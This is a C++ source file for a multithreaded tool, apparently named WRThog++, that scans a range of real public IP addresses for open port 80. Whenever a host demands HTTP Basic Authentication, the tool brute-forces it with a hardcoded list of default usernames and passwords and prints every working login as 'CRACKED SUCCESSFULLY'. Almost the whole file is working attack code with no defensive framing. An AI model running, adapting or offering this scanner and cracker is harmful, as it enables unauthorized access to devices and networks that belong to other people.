#include <string>
#include <iostream>
#include <sstream>
#include <mutex>
#include <queue>

#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <pthread.h>

#define TIMEOUT_SEC 3
#define NUM_THREADS 32
#define LOG true

using namespace std;

/**

 * \/ Never mind; Keenan explained it... nature of wi-fi

 * NOTE NOTE NOTE - On wired ethernet, I'm able to get all 148 hosts to respond
 * (on 209.141.55.0/8).  However, using wi-fi causes some packets to be dropped,
 * methinks - I'm getting only between 127-133 responses for the same CIDR range.
 * The dropped response packets seem to come at the end - is this some sort of
 * DoS mitigation scheme on the part of the wireless routers?  I might need to
 * build in a rate-limiting feature, then...
 */

/**
 * http://stackoverflow.com/questions/9191668/error-longjmp-causes-
 * uninitialized-stack-frame
 *
 * Bug in libcurl.  Fixed by disabling timeouts for DNS lookups.
 */

static mutex print_mutex;

static queue<string> IPs;
static mutex IPs_mutex;

static size_t responsive_hosts = 0;
static mutex responsive_hosts_mutex;

static pthread_t threads[NUM_THREADS];

static string usernames[] = {"", "admin", "root", "user",
      "manager"};

static string passwords[] = {"", "admin", "root", "pass",
      "password", "1234", "0000", "friend", "*?"};

static void crack(CURL *curl, const string& ip_addr);
static void survey(const string& ip_addr);
static bool check_port(const string& ip_addr);//, uint16_t port);
// static void check_port_range(string name);
static void enqueue_IPs(string& prefix);
static void start_workers();
static void thread_wrapper();

int main(int argc, const char *argv[]) {
  //if (!argv[1]) return 0; 

  string name = "209.141.45.";
  if (argv[1]) name = argv[1];    // will convert to C++ string

  enqueue_IPs(name);
  start_workers();
  
  for (size_t i = 0; i < NUM_THREADS; ++i) {
    pthread_join(threads[i], NULL);
  }

  cout << "all done; found " << responsive_hosts << " responsive hosts" << endl;


  return 0;

}

 /* check_port_range(name);
  return 0;

  if (check_port(name.c_str())) cout << "Port responded." << endl;
  else cout << "Port not open." << endl;

  CURL *curl;
  CURLcode curl_res;

  curl = curl_easy_init();

  if (!curl) {
    cerr << "Couldn't initiate curl." << endl;
    return 1;
  }

  curl_easy_setopt(curl, CURLOPT_URL, name.c_str());
  // in the weird case that we have a www redirect or something
  // BUG - curl follows redirect loops (209.141.55.225)
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
  // create a temporary file to write the http to
  //FILE *tf = tmpfile(); 
  FILE *tf = fopen("/dev/null", "w");

  curl_easy_setopt(curl, CURLOPT_WRITEDATA, tf);
  //curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 3000);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, TIMEOUT_SEC);

  curl_res = curl_easy_perform(curl);

  long http_res;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_res); 

  if (curl_res != CURLE_OK) {

    if (curl_res == CURLE_COULDNT_RESOLVE_HOST) {
      cout << "Couldn't resolve host (malformed url?)." << endl;
      return 2;
    }
    
    else if (curl_res == CURLE_OPERATION_TIMEDOUT) {
      cout << "Connection to host timed out." << endl;
      return 3;
    }
  }

  cout << "HTTP Response: " << http_res << endl;

  if (http_res == 401) crack(curl);

  fclose(tf);
  curl_easy_cleanup(curl);

}
*/

static void crack(CURL *curl, const string& ip_addr) {
  print_mutex.lock();
  printf("brute-forcing host's HTTP Basic Authentication...\n");
  print_mutex.unlock();

  for (string& u: usernames) {
    for (string& p: passwords) {
      string auth_str = u + ":" + p;

      curl_easy_setopt(curl, CURLOPT_USERPWD, auth_str.c_str());
      long curl_res = curl_easy_perform(curl);

      if (curl_res != CURLE_OK) return; // would, in theory, not timeout here

      long http_res;
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_res);

      if (http_res == 200) {
        print_mutex.lock();
        printf("CRACKED SUCCESSFULLY! %s (%s)\n\n\n\n\n", ip_addr.c_str(), auth_str.c_str());
        print_mutex.unlock();
        return;     // one login is enough... for now
      }

    }
  }

  print_mutex.lock();
  printf("sorry - could not crack\n");
  print_mutex.unlock();
 
}

static void survey(const string& ip_addr) {
  CURL *curl;
  CURLcode curl_res;

  curl = curl_easy_init();

  if (!curl) {
    print_mutex.lock();
    printf("could't initiate cURL\n");
    print_mutex.unlock();
    return;
  }

  curl_easy_setopt(curl, CURLOPT_URL, ip_addr.c_str());
  // in the weird case that we have a www redirect or something
  // BUG - curl follows redirect loops (209.141.55.225)
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
  // create a temporary file to write the http to
  //FILE *tf = tmpfile(); 
  FILE *tf = fopen("/dev/null", "w");

  curl_easy_setopt(curl, CURLOPT_WRITEDATA, tf);
  //curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 3000);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, TIMEOUT_SEC);

  // BUG NOTE - libcURL bug mentioned on StackOverflow
  curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
  // BUG NOTE - libcURL bug mentioned on StackOverflow

  curl_res = curl_easy_perform(curl);

  long http_res;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_res); 

  if (curl_res != CURLE_OK) {

    if (curl_res == CURLE_COULDNT_RESOLVE_HOST) {
      //cout << "Couldn't resolve host (malformed url?)." << endl;
      print_mutex.lock();
      printf("couldn't resolve host (malformed url?)\n");
      print_mutex.unlock();
      return;
    }
    
    else if (curl_res == CURLE_OPERATION_TIMEDOUT) {
      //cout << "Connection to host timed out." << endl;
      print_mutex.lock();
      printf("connection to host timed out\n");
      print_mutex.unlock();
      return;
    }
  }

  print_mutex.lock();
  printf("received HTTP response status %lu\n", http_res);
  print_mutex.unlock();

  if (http_res == 401) crack(curl, ip_addr);

  fclose(tf);
  curl_easy_cleanup(curl);
}

/**
 * Uses fcntl to provide timeout functionality for connect().
 */
static bool check_port(const string& ip_addr) {//, uint16_t port) {

  if (LOG) {
    print_mutex.lock();
    printf("    %s\n", ip_addr.c_str());
    print_mutex.unlock();
  }

  uint16_t port = 80;
 
  struct sockaddr_in sin;
  struct timeval tv;
  int sock;
  fd_set fdset;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = inet_addr(ip_addr.c_str());
  memset(&sin.sin_zero, 0, sizeof(sin.sin_zero));

  sock = socket(AF_INET, SOCK_STREAM, 0);
  fcntl(sock, F_SETFL, O_NONBLOCK);

  if (sock < 0) return false;

  // we expect connect to return -1 here
  connect(sock, (struct sockaddr *)(&sin), sizeof(sin));

  // caused by something other than fnctl
  if (errno != 115) return false;

  FD_ZERO(&fdset);
  FD_SET(sock, &fdset);
  tv.tv_sec = TIMEOUT_SEC;
  tv.tv_usec = 0;

  // multithreaded version doesn't make it past select() below

  if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
    int so_error;
    socklen_t len = sizeof(so_error);

    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    close(sock);

    if (!so_error) {
      //cout << "found responsive host @ " << ip_addr << ":" << port << endl;
      if (LOG) {
        print_mutex.lock();
        printf("found responsive host @ %s : %i\n", ip_addr.c_str(), port);
        print_mutex.unlock();
      }

      responsive_hosts_mutex.lock();
      ++responsive_hosts;
      responsive_hosts_mutex.unlock();

    }

    return !so_error;
  }

  return false;
}
/*static void check_port_range(string name) {
  // try threading here! :)
  const size_t num_threads = 32;

  pthread_t threads[num_threads];
  const char *thread_results[num_threads];

  for (size_t i = 0; i < num_threads; ++i) {
    ostringstream oss;
    oss << name << i;
    string s_cpp = oss.str();
  
    thread_results[i] = strdup(s_cpp.c_str());
    const char *s = thread_results[i];
    
    pthread_create(&threads[i], NULL, (void* (*)(void*))check_port, (void *)s);
    
  }

  for (size_t i = 0; i < num_threads; ++i) {
    pthread_join(threads[i], NULL);
  }

  // okay, by here, all threads are done.
  for (size_t i = 0; i < num_threads; ++i) {
    free((void *)thread_results[i]); 
  }
}*/


static void start_workers() {
  for (size_t i = 0; i < NUM_THREADS; ++i) {
    pthread_create(&threads[i], NULL, (void* (*)(void*))thread_wrapper, NULL);
  }
}


/**
 * A test method.  Will enqueue IP addresses 209.141.45.0-255.
 * Intended to gauge the ability of WRThog++ to accurately determine
 * which hosts are responding.  Exercises the IPs queue and its mutex.
 */
static void enqueue_IPs(string& prefix) {

  for (size_t suffix = 0; suffix < 256; ++suffix) {
    // need to do this bullshit to build the string
    ostringstream oss;
    oss << prefix << suffix;
    
    IPs_mutex.lock();
    IPs.push(oss.str());
    IPs_mutex.unlock();
  }

}

static void thread_wrapper() {
  // dequeue a string, and send it
  // to the worker thread

  
  while (true) {

    IPs_mutex.lock();

    if (IPs.empty()) {
      IPs_mutex.unlock();
      break;
    }

    string s = IPs.front();   // avoid making a copy
    IPs.pop();

    IPs_mutex.unlock();

    if (check_port(s)) survey(s);

  }

  if (LOG) {
    print_mutex.lock();
    printf("        worker thread #%lu finished\n", pthread_self());
    print_mutex.unlock();
  }

}